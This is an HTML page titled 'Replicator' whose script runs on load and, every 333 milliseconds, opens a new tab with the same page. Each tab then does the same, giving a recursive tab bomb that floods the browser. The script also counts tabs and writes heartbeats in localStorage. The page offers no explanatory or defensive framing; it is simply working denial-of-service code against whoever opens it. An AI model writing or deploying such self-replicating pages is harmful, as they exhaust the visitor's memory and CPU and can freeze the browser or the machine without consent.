<!DOCTYPE html>
<html>
<head><title>Replicator</title></head>
<body style="background:#000;color:red;font-family:monospace;text-align:center;">
    <h2>REPLICATING...</h2>
    <script>
        // 1. Give this tab a name
        const myID = "tab_" + Math.random().toString(36).substr(2, 9);
        
        // 2. Add +1 to the GLOBAL TOTAL in storage
        let total = parseInt(localStorage.getItem('global_total')) || 0;
        localStorage.setItem('global_total', total + 1);

        // 3. Heartbeat for "Active" count
        setInterval(() => {
            localStorage.setItem(myID, Date.now());
        }, 1000);

        // 4. Open the next one (3 per second)
        setInterval(() => {
            window.open("index.html", "_blank");
        }, 333); 

        // Pulse once immediately
        localStorage.setItem(myID, Date.now());
    </script>
</body>
</html>
